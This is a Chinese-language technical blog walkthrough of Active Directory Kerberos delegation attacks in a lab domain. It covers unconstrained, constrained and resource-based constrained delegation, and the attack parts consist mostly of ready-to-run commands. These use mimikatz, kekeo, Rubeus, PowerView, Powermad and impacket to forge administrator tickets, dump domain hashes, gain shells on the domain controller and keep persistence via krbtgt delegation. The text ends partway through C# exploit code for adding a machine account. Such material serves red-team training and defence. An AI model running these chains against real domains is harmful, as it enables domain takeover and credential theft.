<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/6.png" alt="image"></p>
<p>此时拿到了管理员的票据，用mimikatz将票据注入内存中，然后访问域控</p>
<p>导入票据</p>
<p><code>kerberos::ptt xxxxxxxxAdministrator@krbtgt-HIRO.COM.kirbi</code></p>
<p>查看票据</p>
<p><code>kerberos::list</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/7.png" alt="image"></p>
<h4 id="非约束委派spooler打印机">非约束委派+spooler打印机</h4>
<p>费约束委派常规利用感觉还是比较鸡肋，想得到域内权限必须要管理员与配置了委派的机器建立连接，所以有国外的大佬研究出了非约束委派+spooler打印机来强制与指定的主机进行连接。
开始域控为server2012，后面网上有的大佬说可能是版本的问题，后面升级到了server2016还是报错，这种情况复现不了了，有兴趣的可以自己试一试。<a href="https://blog.csdn.net/a3320315/article/details/106511098" title="也可以参考这篇文章">也可以参考这篇文章</a>。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/8.png" alt="image"></p>
<hr>
<h2 id="约束委派">约束委派</h2>
<p>由于非约束委派的不安全性，微软在windows server 2003中引入了约束委派，对Kerberos协议进行了拓展，引入了S4U，其中S4U支持两个子协议：Service for User to Self (<code>S4U2Self</code>)和 Service for User to Proxy (S4U2proxy)，这两个扩展都允许服务代表用户从KDC请求票证。<code>S4U2self可以代表自身请求针对其自身的可转发的Kerberos服务票据(ST1)</code>；<code>S4U2proxy可以以用户的名义请求其它服务的ST2</code>，约束委派就是限制了S4U2proxy扩展的范围.</p>
<p>其中：</p>
<p><code>S4U2Self</code>（用用户的TGT向KDC请求用户的可转发的ST1，再用这张ST1去发起S4U2proxy请求。）
通过此扩展可以拿到一张标识任意用户身份的ST，它的作用其实是<code>协议转换</code>。有时用户会通过<code>其他协议</code>（例如NTLM或什至基于表单的身份验证）对服务进行身份验证，因此他们不会将TGS发送给服务。在这种情况下，服务可以<code>调用S4U2Self来要求身份验证服务为其自身的任意用户生成TGS</code>，然后可以在调用S4U2Proxy时将其用作依据。例如网站A服务器可以使用它去向KDC请求一张用户B身份的ST1，网站A服务器再用这张ST1去发起S4U2proxy请求。</p>
<p><code>S4U2proxy</code>（<strong>拿用户的可转发的ST1请求用于访问服务器的ST2</strong>）
该拓展作用是使用一张用户A身份的ST1去向KDC请求一张用于访问文件服务器B的ST2，这张ST2的身份还是用户的，这样的话网站A就可以利用用户A的权限去访问文件服务器B上的文件了。</p>
<h3 id="大致流程-1">大致流程：</h3>
<p>user访问serviceA，向DC发起kerberos认证，域控返回user的TGT和ST1票据，user使用ST1票据对serviceA进行访问</p>
<p>如果配置了serviceA到serviceB的约束委派，则serviceA能<strong>使用S4U2Proxy协议将用户发给自己的可转发的ST1票据以用户的身份发给DC。</strong></p>
<p>域控返回serviceA一个用来访问serviceB的ST2票据,这样serviceA就能以用户的身份对serviceB发起访问。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/9.png" alt="image"></p>
<p>由于服务用户<code>只能获取某个用户（或主机）的服务的ST1而非TGT</code>，<code>所以只能模拟用户访问特定的服务</code>，但是如果能拿到约束委派用户（或主机）的密码或者Hash，就可以<code>伪造S4U的请求，伪装成服务用户以任意用户的权限申请访问指定服务的ST2</code>。</p>
<h3 id="利用-1">利用：</h3>
<pre tabindex="0"><code>域：hiro.com
域控:WIN-KONG@192.168.228.10  域管：administrator
受委派机器：WIN-RRI9T9SN85D@192.168.228.15 域用户：win7
</code></pre><p>首先在域控上将域用户win7注册成为SPN服务账号</p>
<p><code>setspn -S cifs/WIN-RRI9T9SN85D.hiro.com win7</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/10.png" alt="image"></p>
<p>查看是否注册成功</p>
<p><code>setspn -L win7</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/11.png" alt="image"></p>
<p>然后将win7用户设置约束委派的属性，为访问域控的cifs（<code>访问文件夹</code>）</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/12.png" alt="image"></p>
<p>通过命令行打开adsiedit.msc查看win7用户属性，可以看到：</p>
<p><strong>当被设置为约束委派的时候，它的userAccountControl会包含TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION字段。</strong></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/13.png" alt="image"></p>
<p>并且比非约束委派的账户多了msDS-AllowedToDelegateTo字段，里面包含了允许委派的服务.</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/14.png" alt="image"></p>
<p>当知道win7这个服务用户的明文密码或者Hash时，可以用kekeo请求它的TGT</p>
<p>拥有明文密码</p>
<p><code>tgt::ask /user:win7 /domain:hiro.com /password:123456QWE. </code></p>
<p>拥有账户的Hash</p>
<p><code>tgt::ask /user:win7 /domain:hiro.com /NTLM:xxxx</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/15.png" alt="image"></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/16.png" alt="image"></p>
<p>PS:如果既不知道明文也不知道Hash，如果有了服务用户登录的主机权限，可以用mimikatz从内存中把服务用户的TGT dump下来照样可以实现</p>
<p>从内存中导出所有票据</p>
<p><code>sekurlsa::tickets /export</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/17.png" alt="image"></p>
<p>然后通过win7的TGT伪造s4u请求以administrator身份请求访问WIN-KONG cifs的ST</p>
<p><code>tgs::s4u /tgt:TGT_win7@HIRO.COM_krbtgt~hiro.com@HIRO.COM.kirbi /user:Administrator@hiro.com /service:cifs/WIN-KONG.hiro.com</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/%2018.png" alt="image"></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/19.png" alt="image"></p>
<p>用mimikatz将票据导入内存中</p>
<p><code>kerberos::ptt TGS_Administrator@hiro.com@HIRO.COM_cifs~WIN-KONG.hiro.com@HIRO.COM.kirbi</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/20.png" alt="image"></p>
<p>访问域控：</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/21.png" alt="image"></p>
<hr>
<h2 id="约束委派请求过程">约束委派请求过程：</h2>
<p><code>tgt::ask /user:win7 /domain:hiro.com /password:123456QWE. </code></p>
<h3 id="as-req"><strong>AS-REQ</strong></h3>
<p>以用户win7请求TGT</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/22.png" alt="image"></p>
<h3 id="as-rep"><strong>AS-REP</strong></h3>
<p>AS返回用户win7的TGT，也就是得到了</p>
<p><code>TGT_win7@HIRO.COM_krbtgt~hiro.com@HIRO.COM.kirbi</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/23.png" alt="image"></p>
<p><code>tgs::s4u /tgt:TGT_win7@HIRO.COM_krbtgt~hiro.com@HIRO.COM.kirbi /user:Administrator@hiro.com /service:cifs/WIN-KONG.hiro.com</code></p>
<h3 id="tgs-req"><strong>TGS-REQ</strong></h3>
<p>win7用户用上一步得到的TGT，用上S4U2Self协议，以administrator的名义向TGS申请一张访问自身服务并且可转发的ST1票据。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/24.png" alt="image"></p>
<h3 id="tgs-rep"><strong>TGS-REP</strong></h3>
<p>TGS返回administrator的ST1票据给win7</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/25.png" alt="image"></p>
<h3 id="tgs-req-1"><strong>TGS-REQ</strong></h3>
<p>win7用户拿到了administrator的ST1票据后，win7带上这张<strong>可转发</strong>的访问自身服务的票据，用上S4U2Proxy协议，<strong>以administrator用户的名义请求一张访问WIN-KONG的CIFS服务的ST2票据</strong></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/26.png" alt="image"></p>
<h3 id="tgs-rep-1"><strong>TGS-REP</strong></h3>
<p>TGS返回以administrator用户访问WIN-KONG的CIFS服务的票据，也就是得到了<code>TGS_Administrator@hiro.com@HIRO.COM_cifs~WIN-KONG.hiro.com@HIRO.COM.kirbi</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/27.png" alt="image"></p>
<p>通过流程可以看出，<strong>第一步生成的可转发的ST1只是为了请求第二步以administrator用的名义请求一张访问WIN-KONG的CIFS服务的ST2票据</strong>。</p>
<hr>
<h3 id="利用约束委派权限维持"><strong>利用约束委派权限维持</strong></h3>
<p><strong>通过约束委派生成黄金票据</strong></p>
<p><code>TGT由krbtgt Hash加密，如果能通过委派krbtgt服务，那么就能伪造任意用户的TGT了。</code></p>
<p>由于krbtgt默认是禁用的，所以无法使用页面添加它的SPN。</p>
<p><strong>域控通过powershell添加win7到krbtgt的约束委派：</strong></p>
<pre tabindex="0"><code>
powershell -exec bypass

Import-Module ActiveDirectory

$user = Get-ADUser win7  （win7为设置为约束委派的服务账号）

Set-ADObject $user -Add @{ &#34;msDS-AllowedToDelegateTo&#34; = @(&#34;krbtgt/hiro.com&#34;) }
</code></pre><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/28.png" alt="image"></p>
<p><strong>利用impacket套件攻击</strong></p>
<p>伪造administrator的TGT</p>
<p><code>python3 getST.py -dc-ip 192.168.228.10 -spn krbtgt/hiro.com -impersonate administrator hiro.com/win7:123456QWE.</code></p>
<p>导入票据</p>
<p><code>export KRB5CCNAME=administrator.ccache</code></p>
<p>用wmiexec弹出一个权限为administrator交互式的shell</p>
<p><code>python3 wmiexec.py -no-pass -k administrator@WIN-KONG.hiro.com -dc-ip 192.168.228.10</code></p>
<p>导出域内哈希</p>
<p><code>python3 secretsdump.py -no-pass -k WIN-KONG.hiro.com</code></p>
<hr>
<h2 id="基于资源的约束委派"><strong>基于资源的约束委派</strong></h2>
<p>传统的委派，在设置的过程中其实都是需要SeEnableDelegation特权，而这个特权需要域管理员才能设置。<strong>相对于传统的委派，基于资源的约束委派它不需要域管理员设置，而是机器本身。</strong></p>
<h3 id="约束委派和基于资源的约束委派的区别">约束委派和基于资源的约束委派的区别：</h3>
<p>前者：<code>通过服务A委派到服务B</code>，实际是在服务A上增加<strong>TRUSTED_FOR_DELEGATION</strong>字段（<code>非约束委派</code>），<strong>TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION</strong>和<strong>msDS-AllowedToDelegateTo</strong> （<code>约束委派</code>）字段来达到委派的目的。</p>
<p>后者：<code>通过服务B允许服务A委派到服务B</code>，实际是通过服务B自身赋予<strong>msDS-AllowedToActOnBehalfOfOtherIdentity</strong>字段，从而允许服务A对服务B的基于资源的约束委派。</p>
<p>所以当利用到基于资源的约束委派的时候，<code>服务A的两个字段是没有赋值的</code>，<strong>当这两个字段没有被赋值的时候，通过S4U2Self得到的ST服务票证是<code>不可被转发</code>的</strong>，<strong>而S4U2Proxy的作用就是<code>将可转发的ST票据转发到其他服务</code>进行委派认证</strong>。<strong>但是</strong>：<strong>在基于资源的约束委派过程中</strong>，<strong>不可转发的ST仍可以通过S4U2Proxy转发到其他服务进行委派认证，并且最后还会返回一张可转发的ST服务票证</strong>。</p>
<p>因此，如果能够在服务B上配置允许服务A的基于资源的约束委派，那么就可以通过控制服务A使用S4U2Self向域控请求任意用户访问自身的服务票据，最后再使用S4U2Proxy转发此ST1票据去请求访问服务B的可转发的ST2服务票据，就可以模拟任意用户访问服务B了。这里可以以普通域用户的身份去创建机器账号作为服务A。</p>
<h3 id="条件">条件</h3>
<p><strong>利用基于资源的约束委派(RBCD)需要2个条件：</strong></p>
<p><strong>1.拥有将域机器加入域的域用户的权限</strong>。（将机器B加入域的域用户拥有修改机器B的msDS-AllowedToActOnBehalfOfOtherIdentity属性的权限。）</p>
<p><strong>2.一个任意服务账户或者一个机器账户</strong>（每一个域用户默认可以添加10个机器账户，可以通过LDAP中的MAQ属性查看）</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/29.png" alt=""></p>
<h3 id="利用-2">利用：</h3>
<p>域：hiro.com
域控：WIN-KONG@192.168.228.10 域管：administrator
域内机器：DESKTOP-P34E60A，win10把这台机器加入到域内</p>
<p><strong>通过ADFind查找将域机器拉入域的用户的SID：</strong></p>
<p><code>AdFind.exe -b &quot;DC=hiro,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369))&quot; cn mS-DS-CreatorSID</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/30.png" alt="image"></p>
<p><strong>查看S-1-5-21-3105699010-1460039537-418241315-1118是谁：</strong></p>
<p><code>AdFind.exe -b &quot;DC=hiro,DC=com&quot; -f &quot;(&amp;(objectsid=S-1-5-21-3105699010-1460039537-418241315-1118))&quot; objectclass cn dn</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/31.png" alt="image"></p>
<p>假如现在已经拿到了把DESKTOP-P34E60A这台机器加入域的用户win10的权限</p>
<p>使用whoami /all查询当前用户的sid</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/32.png" alt="image"></p>
<p>同样可以通过用户的sid查看哪些域机器是通过自己加入到域内的：</p>
<p><code>AdFind.exe -b &quot;DC=hiro,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(mS-DS-CreatorSID=S-1-5-21-3105699010-1460039537-418241315-1118))&quot; cn sAMAccountType objectCategory</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/33.png" alt="image"></p>
<p><code>如果一个机器账号没有mS-DS-CreatorSID，那么他是被域管拉入到域内的</code></p>
<p>利用powermad添加机器账户：(<a href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a>)</p>
<p><code>Import-Module .\Powermad.ps1</code></p>
<p><strong>以win10用户创建一个域机器名为win10system，密码为win10</strong></p>
<p><code>New-MachineAccount -MachineAccount win10system -Password $(ConvertTo-SecureString &quot;win10&quot; -AsPlainText -Force)</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/34.png" alt="image"></p>
<p><strong>验证是否创建成功：</strong></p>
<p><code>net group &quot;domain computers&quot; /do</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/35.png" alt="image"></p>
<p><strong>查询添加机器的SID：</strong></p>
<p>1.域控上查询：</p>
<p><code>dsquery computer | dsget computer -dn -sid</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/36.png" alt="image"></p>
<p>或者powershell运行Get-ADComputer win10system</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/37.png" alt="image"></p>
<p>2.域机器上查询：（使用empire下的powerview）</p>
<pre tabindex="0"><code>Import-Module .\powerview.ps1

Get-DomainComputer -Identity win10system
</code></pre><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/38.png" alt="image"></p>
<p>win10用户设置win10system到DESKTOP-P34E60A的基于资源的约束委派（使用empire下的powerview）</p>
<pre tabindex="0"><code>
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3105699010-1460039537-418241315-1151)&#34;

$SDBytes = New-Object byte[] ($SD.BinaryLength)

$SD.GetBinaryForm($SDBytes, 0)

Get-DomainComputer DESKTOP-P34E60A| Set-DomainObject -Set @{&#39;msds-allowedtoactonbehalfofotheridentity&#39;=$SDBytes} -Verbose
</code></pre><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/39.png" alt="image"></p>
<p>检查是否配置成功</p>
<p><code>Get-DomainComputer DESKTOP-P34E60A -Properties msds-allowedtoactonbehalfofotheridentity</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/40.png" alt="image"></p>
<p>攻击完成清除基于资源的约束委派配置：</p>
<p><code>Set-DomainObject DESKTOP-P34E60A -Clear 'msds-allowedtoactonbehalfofotheridentity' -Verbose</code></p>
<p>也可以在域控上通过命令行打开adsiedit.msc查看CN=DESKTOP-P34E60A机器属性，可以看到：</p>
<p><code>当被设置为基于资源的约束委派的时候，它的msds-allowedtoactonbehalfofotheridentity会包含有效字段。</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/41.png" alt="image"></p>
<p>现在已经配置好利用条件就可以通过基于资源的约束委派进行攻击了</p>
<p><strong>1.使用rubues获取票据</strong></p>
<p><code>Rubeus.exe hash /user:win10system /password:win10 /domain:hiro.com</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/42.png" alt="image"></p>
<p><code>Rubeus.exe s4u /user:win10system$ /rc4:6C4FD556DB12BE51BACD9A3CC19D486E /impersonateuser:administrator /msdsspn:cifs/DESKTOP-P34E60A /ptt</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/43.png" alt="image"></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/44.png" alt="image"></p>
<p><strong>2.使用impacket套件获取</strong></p>
<pre tabindex="0"><code>
python3 getST.py -dc-ip 192.168.228.10 -spn cifs/DESKTOP-P34E60A -impersonate administrator hiro.com/win10system$:win10

set KRB5CCNAME=administrator.ccache

python3 wmiexec.py -no-pass -k administrator@DESKTOP-P34E60A.hiro.com -dc-ip 192.168.228.10
</code></pre><h3 id="利用基于资源的约束委派进行权限维持">利用基于资源的约束委派进行权限维持</h3>
<p>跟约束委派利用相似，可以配置win10system到krbtgt的基于资源的约束委派，只要有了win10system的权限，就能伪造任意用户请求krbtgt服务，则可以请求到任意用户的TGT.</p>
<p>在域控上执行：</p>
<pre tabindex="0"><code>
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3105699010-1460039537-418241315-1151)&#34;

$SDBytes = New-Object byte[] ($SD.BinaryLength)

$SD.GetBinaryForm($SDBytes, 0)

Set-DomainObject krbtgt -Set @{&#39;msds-allowedtoactonbehalfofotheridentity&#39;=$SDBytes} -Verbose
</code></pre><p>可以看到brbtgt的msds-allowedtoactonbehalfofotheridentity会包含有效字段。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/45.png" alt="image"></p>
<p><strong>1.使用rubeus伪造administrator请求TGT</strong></p>
<p><code>Rubeus.exe s4u /user:win10system$ /rc4:6C4FD556DB12BE51BACD9A3CC19D486E /impersonateuser:administrator /msdsspn:krbtgt /ptt</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/46.png" alt="image"></p>
<p>klist查看缓存票证</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/47.png" alt="image"></p>
<p>访问域控</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/48.png" alt="image"></p>
<p><strong>2.同样的也能用impacket套件</strong></p>
<pre tabindex="0"><code>
python3 getST.py -dc-ip 192.168.228.10 -spn krbtgt -impersonate administrator hiro.com/win10system$:win10

set KRB5CCNAME=administrator.ccache

python3 wmiexec.py -no-pass -k administrator@WIN-KONG.hiro.com -dc-ip 192.168.228.10
</code></pre><h2 id="基于资源的约束委派烂番茄">基于资源的约束委派(烂番茄)</h2>
<p>基于资源的约束委派通过修改自身msDS-AllowedToActOnBehalfOfOtherIdentity字段达到委派的目的，默认把这台域机器拉入域的域用户有这个权限，还有谁有？</p>
<p>因为evil这台机器通过07用户拉入域内，通过AdFind遍历evil的ACL，通过write筛选对其具有写权限的用户。</p>
<p><code>AdFind -b &quot;CN=evil,CN=Computers,DC=redteam,DC=lab&quot; -s base nTSecurityDescriptor -sddl++ -resolvesids | findstr &quot;write”</code></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/49.png" alt=""></p>
<p>可以看到不只是07这个用户，SYSTEM权限的用户也对这个对象具有写的权限。</p>
<h3 id="攻击面通过iis等以服务权限起的域用户拿到当前域机器最高权限">攻击面：通过iis等以服务权限起的域用户拿到当前域机器最高权限。</h3>
<p>官方文档中(<a href="https://docs.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities">https://docs.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities</a>)明确表示iis等服务用户以机器账号(SYSTEM)请求网络资源。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/50.png" alt=""></p>
<p>这样会导致一个非常严重的问题：不止iis，所有低权限服务(例如network service这类型的本机服务)都是以机器账户身份去请求的域内资源。利用这一特性可以直接使其连接到域控的ldap设置基于当前机器的基于资源的约束委派，造成当前域机器沦陷。</p>
<h2 id="演示">演示</h2>
<p>前面已知：</p>
<ol>
<li>域内用户默认可以创建十台域机器。</li>
<li>低权限服务(例如network service这类型的本机服务)都是以机器账户身份请求域内资源。</li>
<li>机器账号对其本身有WriteProperty权限。</li>
</ol>
<p>当前环境：</p>
<ol>
<li>在域内域机器web2008上存在iis服务，攻击者拿到webshell后发现当前权限为iis，但是此用户依然是域用户，可以创建机器账号；</li>
<li>iis以机器账户请求域内资源，对其机器本身有WriteProperty权限，可以设置自身的msDS-AllowedToActOnBehalfOfOtherIdentity字段来设置基于资源的约束委派。</li>
</ol>
<p>所以可以利用web2008创建域机器（此处为evilpc），并通过writelproperty设置evilpc到其的基于资源的约束委派。</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/51.png" alt=""></p>
<p>通过查看LDAP确定是否设置成功</p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/52.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/%E5%A7%94%E6%B4%BE/53.png" alt=""></p>
<pre tabindex="0"><code>python3 getST.py -dc-ip 192.168.129.130 redteam/evilpc\$:123456 -spn cifs/web2008.redteam.lab -impersonate administrator

export KRB5CCNAME=administrator.ccache

python3 smbexec.py -no-pass -k redteam/administrator@web2008.redteam.lab
</code></pre><h2 id="exp">EXP</h2>
<p>ATEAM的demo（链接在下面）</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">using</span> <span class="n">System</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">AccessControl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Principal</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">using</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">namespace</span> <span class="n">Addnew_MachineAccount</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">class</span> <span class="n">Program</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">static</span> <span class="kt">void</span> <span class="n">Main</span><span class="p">(</span><span class="n">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="n">String</span> <span class="n">DomainController</span> <span class="o">=</span> <span class="s">&#34;192.168.129.130&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="n">String</span> <span class="n">Domain</span> <span class="o">=</span> <span class="s">&#34;redteam.lab&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="c1">//String username = args[0]; //域用户名
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">      <span class="c1">//String password = args[1]; //域用户密码
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">      <span class="n">String</span> <span class="n">new_MachineAccount</span> <span class="o">=</span> <span class="s">&#34;evilpc&#34;</span><span class="p">;</span> <span class="c1">//添加的机器账户
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">      <span class="n">String</span> <span class="n">new_MachineAccount_password</span> <span class="o">=</span> <span class="s">&#34;123456&#34;</span><span class="p">;</span> <span class="c1">//机器账户密码
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">      <span class="n">String</span> <span class="n">victimcomputer</span> <span class="o">=</span> <span class="s">&#34;web2008&#34;</span><span class="p">;</span> <span class="c1">//需要进行提权的机器
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">      <span class="n">String</span> <span class="n">victimcomputer_ldap_path</span> <span class="o">=</span> <span class="s">&#34;LDAP://CN=web2008,CN=Computers,DC=redteam,DC=lab&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="n">String</span> <span class="n">machine_account</span> <span class="o">=</span> <span class="n">new_MachineAccount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="n">String</span> <span class="n">sam_account</span> <span class="o">=</span> <span class="n">machine_account</span> <span class="o">+</span> <span class="s">&#34;$&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="c1">//machine_account=&#34;evilpc&#34;;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">      <span class="c1">//sam_account=&#34;evilpc$&#34;;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">      <span class="n">String</span> <span class="n">distinguished_name</span> <span class="o">=</span> <span class="s">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="n">String</span><span class="p">[]</span> <span class="n">DC_array</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="n">distinguished_name</span> <span class="o">=</span> <span class="s">&#34;CN=&#34;</span> <span class="o">+</span> <span class="n">machine_account</span> <span class="o">+</span> <span class="s">&#34;,CN=Computers&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="c1">//distinguished_name=CN=evilpc,CN=computers;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">      <span class="n">DC_array</span> <span class="o">=</span> <span class="n">Domain</span><span class="p">.</span><span class="n">Split</span><span class="p">(</span><span class="sc">&#39;.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
